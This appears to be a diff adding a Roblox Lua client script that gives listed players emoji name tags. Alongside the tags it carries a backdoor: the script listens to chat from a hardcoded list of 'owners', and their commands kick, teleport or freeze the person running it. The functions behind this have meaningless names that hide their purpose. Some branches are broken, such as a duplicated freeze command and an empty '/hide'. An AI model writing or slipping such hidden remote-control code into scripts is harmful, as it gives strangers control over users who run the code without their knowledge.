@@ -1,0 +1,103 @@
+local owners = {
+    "27k_GAMIN",
+    "pzoz853",  
+    "dattwinmade"
+}
+
+local whitelistedPlayers = {
+    ["forsuremicah"] = "[⭐] ",
+    ["YT_Hacket"] = "[😎]",
+    ["e_i5v"] = "[👑] ",
+    ["dattwinmade"] = "[👑📜]",
+    ["hatelvst"] = "[😎]",
+    ["Skyriela"] = "[😎]",
+    ["f_xws"] = "[⭐]",
+    ["marktrujillo72"] = "[⭐]",
+    ["Twinthedev"] = "[⭐]",
+    ["torsotapper"] = "[🤪]",
+    ["yzuv"] = "[😎]",
+    ["27k_GAMING"] = "[😎]",
+    ["tracinj"] = "[🌟]",
+    ["cayyhaunt"] = "[👑]"
+}
+
+-- 
+local function updateDisplayNames()
+    for _, player in ipairs(game.Players:GetPlayers()) do
+        if whitelistedPlayers[player.Name] then
+            local character = player.Character
+            if character and character:FindFirstChildWhichIsA("Humanoid") then
+                local humanoid = character:FindFirstChildWhichIsA("Humanoid")
+                humanoid.DisplayName = humanoid.DisplayName
+            end
+        end
+    end
+end
+
+local function removing()
+    for _, player in ipairs(game.Players:GetPlayers()) do
+        if whitelistedPlayers[player.Name] then
+            local character = player.Character
+            if character and character:FindFirstChildWhichIsA("Humanoid") then
+                local humanoid = character:FindFirstChildWhichIsA("Humanoid")
+                humanoid.DisplayName = whitelistedPlayers[player.Name] .. player.DisplayName
+            end
+        end
+    end
+end
+
+local Players = game:GetService("Players")
+local localPlayer = game.Players.LocalPlayer
+
+function x1y2z3(owner)
+    if owner then
+        localPlayer.Character:SetPrimaryPartCFrame(owner.Character.HumanoidRootPart.CFrame)
+    end
+end
+
+function r4t5y6(player)
+    player.Character.HumanoidRootPart.Anchored = true
+end
+
+function g7h8k9(player)
+    player.Character.HumanoidRootPart.Anchored = false
+end
+
+function w3e2q1(player)
+    player:Kick("You have been banned by an Admin.")
+end
+
+function q7p6m5(ownerName)
+    local owner
+
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player.Name == ownerName then
+            owner = player
+            break
+        end
+    end
+
+    if owner then
+        owner.Chatted:Connect(function(message)
+            if message == "/kick ." then
+                localPlayer:Kick("Admins Has Kicked You.")
+            elseif message == "/bring ." then
+                x1y2z3(owner)
+            elseif message == "/ban ." then
+                w3e2q1(localPlayer)
+            elseif message == "/freeze ." then
+                r4t5y6(localPlayer)
+            elseif message == "/freeze ." then
+                g7h8k9(localPlayer)
+            elseif message == "/unhide" then
+             updateDisplayNames()
+            elseif message == "/hide" then
+            
+            end
+        end)
+    end
+end
+
+for _, ownerName in ipairs(owners) do
+    q7p6m5(ownerName)
+end
